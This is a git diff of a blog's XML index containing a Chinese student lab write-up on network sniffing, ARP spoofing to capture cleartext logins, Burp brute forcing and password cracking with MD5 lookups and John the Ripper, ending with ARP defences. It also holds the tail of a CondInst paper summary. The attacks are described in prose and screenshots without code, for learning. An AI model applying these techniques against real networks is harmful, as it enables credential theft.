style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>的组合）来预测实例的掩码。由于任务头是一个非常紧凑的网络（3个1×1卷积，共有8个信道和169个参数），计算掩码的开销非常小。例如，即使有100次检测（即MS-COCO上每个图像的最大检测次数），掩模头上总共也只有不到5毫秒的时间，这只给基本检测器FCOS增加了10%的计算时间。相比之下，Mask R-CNN的Mask head有4个3×3的256个通道，参数大于2.3M，计算时间较长。</p>
-<p><img src="https://img-blog.csdnimg.cn/20201030065343641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h1>0x06 小结</h1>
-<p>提出了一个新的更简单的实例分割框架Condinst。不同于以往的方法，如Mask R-CNN，它使用固定权重的任务头，CondInst将掩码头设置在实例上，并动态生成掩码头的过滤器。这不仅降低了掩模头的参数和计算复杂度，而且消除了ROI操作，从而形成了一个更快、更简单的实例分割框架。</p>
-]]></content>
-      <categories>
-        <category>CV</category>
-      </categories>
-      <tags>
-        <tag>CV</tag>
+        <tag>security</tag>
       </tags>
   </entry>
   <entry>
@@ -372,7 +530,7 @@ Android 获取方法：Android： 拨号<code>*#*#4636#*#*</code>进入手机信
 <p>如果网卡处于混杂（promiscuous）模式，那么它就可以捕获网络上所有的数据帧，处于对网络的“监听”状态，如果一台机器被配置成这样的方式，它（包括其软件）就是一个嗅探器。<br>
 在交换型以太网中，上述条件2是不满足的。所有的主机连接到SWITCH，<strong>SWITCH比HUB更聪明</strong>，它知道每台计算机的MAC地址信息和与之相连的特定端口，发给某个主机的数据包会被SWITCH从特定的端口送出，而不是象HUB那样，广播给网络上所有的机器。这种传输形式使交换型以太网的性能大大提高，同时还有一个附加的作用：使传统的嗅探器无法工作。<br>
 交换型网络环境嗅探的核心问题是：如何使本不应到达的数据包到达本地。通常的方法有<strong>MAC洪水包和ARP欺骗</strong>。其中MAC洪水包是向交换机发送大量含有虚构MAC地址和IP地址的IP包，使交换机无法处理如此多的信息，致使交换机就进入了所谓的&quot;打开失效&quot;模式，也就是开始了类似于集线器的工作方式，向网络上所有的机器广播数据包。</p>
-<h2 id="1x02-arp欺骗"><a class="header-anchor" href="#1x02-arp欺骗">¶</a>1x02 ARP欺骗</h2>
+<h2 id="1x02-ARP欺骗"><a class="header-anchor" href="#1x02-ARP欺骗">¶</a>1x02 ARP欺骗</h2>
 <p>每一个主机都有一个ARP高速缓存，此缓存中记录了最近一段时间内其它IP地址与其MAC地址的对应关系。如果本机想与某台主机通信，则首先在ARP高速缓存中查找此台主机的IP和MAC信息，如果存在，则直接利用此MAC地址构造以太帧；如果不存在，则向本网络上每一个主机广播一个ARP请求报文，其意义是&quot;如果你有此IP地址，请告诉我你的MAC地址&quot;，目的主机收到此请求包后，发送一个ARP响应报文，本机收到此响应后，把相关信息记录在ARP高速缓存中，以下的步骤同上。<br>
 <strong>ARP报文格式：</strong><br>
 <img src="https://img-blog.csdnimg.cn/20201104213312881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
@@ -395,7 +553,7 @@ Burp Suite是一个用于测试Web应用程序安全性的图形工具。该工�
 </ul>
 <h1>0x02 网络嗅探部分</h1>
 <p><img src="https://img-blog.csdnimg.cn/20201104213552527.png#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="1x01-sinffer-wireshark抓包"><a class="header-anchor" href="#1x01-sinffer-wireshark抓包">¶</a>1x01 sinffer（Wireshark抓包）</h2>
+<h2 id="1x01-sinffer（Wireshark抓包）"><a class="header-anchor" href="#1x01-sinffer（Wireshark抓包）">¶</a>1x01 sinffer（Wireshark抓包）</h2>
 <p>A主机上外网，B运行sinffer(Wireshark)选定只抓源为A的数据)。</p>
 <p>我们选择Metasploit2主机作为A，Kali作为B。首先我们需要确认kali和Windows处于同一网段（可相互ping通的状态)。<strong>（PS：这一步是使用的Metasploit2，后面因为需要到网页里面提交数据就换成了win7）</strong></p>
 <p><img src="https://img-blog.csdnimg.cn/20201104223018979.png#pic_center" alt="在这里插入图片描述"><br>
@@ -404,7 +562,7 @@ Burp Suite是一个用于测试Web应用程序安全性的图形工具。该工�
 接下来我们使用A去ping B观察一下wireshark的反应。<br>
 <img src="https://img-blog.csdnimg.cn/20201104224124598.png#pic_center" alt="在这里插入图片描述"></p>
 <p>但是如果A ping的是百度，或者往某一个网址发送包含账号和密码的HTTP报文。就可以获取相应信息。</p>
-<h2 id="1x02-arp欺骗"><a class="header-anchor" href="#1x02-arp欺骗">¶</a>1x02 ARP欺骗</h2>
+<h2 id="1x02-ARP欺骗-v2"><a class="header-anchor" href="#1x02-ARP欺骗-v2">¶</a>1x02 ARP欺骗</h2>
 <p>关于ARP的原理已经攻击原理我在以前的一篇博客中有写到：<br>
 <a href="https://blog.csdn.net/python_LC_nohtyp/article/details/109270741">【白帽子学习笔记20】arp协议原理与攻击应用</a></p>
 <p>为了欺骗B，让B把报文全部发到A这里来。A需要冒充局域网中交换机的角色。<strong>（此时B为Win7主机）</strong><br>
@@ -449,7 +607,7 @@ Burp Suite是一个用于测试Web应用程序安全性的图形工具。该工�
 <img src="https://img-blog.csdnimg.cn/20201105012432476.png#pic_center" alt="在这里插入图片描述"><br>
 在数据报里面成功的发现我过程输入的账号和密码的明文信息。<br>
 <img src="https://img-blog.csdnimg.cn/20201105012544392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="1x03-wireshark分析文件"><a class="header-anchor" href="#1x03-wireshark分析文件">¶</a>1x03 WireShark分析文件</h2>
+<h2 id="1x03-WireShark分析文件"><a class="header-anchor" href="#1x03-WireShark分析文件">¶</a>1x03 WireShark分析文件</h2>
 <p><strong>1.如何发现有FTP服务器？且找到FTP服务器的IP地址？</strong></p>
 <p>通过观察流量数据，可以发现有大量基于FTP协议传输的数据库，所以推测有FTP服务器。<br>
 <img src="https://img-blog.csdnimg.cn/20201105013341403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
@@ -493,13 +651,13 @@ Burp Suite是一个用于测试Web应用程序安全性的图形工具。该工�
 <img src="https://img-blog.csdnimg.cn/20200812141849955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
 爆破成功啦！<br>
 <img src="https://img-blog.csdnimg.cn/20200812141942854.png#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="1x04-md5破解"><a class="header-anchor" href="#1x04-md5破解">¶</a>1x04 MD5破解</h2>
+<h2 id="1x04-MD5破解"><a class="header-anchor" href="#1x04-MD5破解">¶</a>1x04 MD5破解</h2>
 <p>打开一个在线md5解密网站就可以解开简单的md5码。<br>
 <img src="https://img-blog.csdnimg.cn/20201105025933699.png#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="1x05-john-the-ripper"><a class="header-anchor" href="#1x05-john-the-ripper">¶</a>1x05 John the Ripper</h2>
+<h2 id="1x05-John-the-Ripper"><a class="header-anchor" href="#1x05-John-the-Ripper">¶</a>1x05 John the Ripper</h2>
 <p>John the Ripper 是一款速度很快的密码破解工具，目前可用于 Unix、macOS、Windows、DOS、BeOS 与 OpenVMS 等多种操作系统。最初其主要目的是检测弱 Unix 密码，而现在，除了支持许多 Unix crypt(3) 密码哈希类型，John the Ripper “-jumbo”版本还支持数百种其它哈希类型和密码。</p>
 <h1>0x03 做有所得</h1>
-<h2 id="1x01-如何防止arp攻击"><a class="header-anchor" href="#1x01-如何防止arp攻击">¶</a>1x01 如何防止ARP攻击</h2>
+<h2 id="1x01-如何防止ARP攻击"><a class="header-anchor" href="#1x01-如何防止ARP攻击">¶</a>1x01 如何防止ARP攻击</h2>
 <ul>
 <li>
 <p>终端对网关的绑定要坚实可靠，这个绑定能够抵制被病毒捣毁。</p>
@@ -511,7 +669,7 @@ Burp Suite是一个用于测试Web应用程序安全性的图形工具。该工�
 <p>网络内要有一个最可依赖的机构，提供对网关IP-MAC最强大的保护。它既能够分发正确的网关信息，又能够对出现的假网关信息立即封杀。</p>
 </li>
 </ul>
-<h2 id="1x02-安全的密码-口令-应遵守的原则"><a class="header-anchor" href="#1x02-安全的密码-口令-应遵守的原则">¶</a>1x02 安全的密码（口令）应遵守的原则</h2>
+<h2 id="1x02-安全的密码（口令）应遵守的原则"><a class="header-anchor" href="#1x02-安全的密码（口令）应遵守的原则">¶</a>1x02 安全的密码（口令）应遵守的原则</h2>
 <ul>
 <li>避免出现弱密码</li>
 <li>记住的密码才是好密码</li>
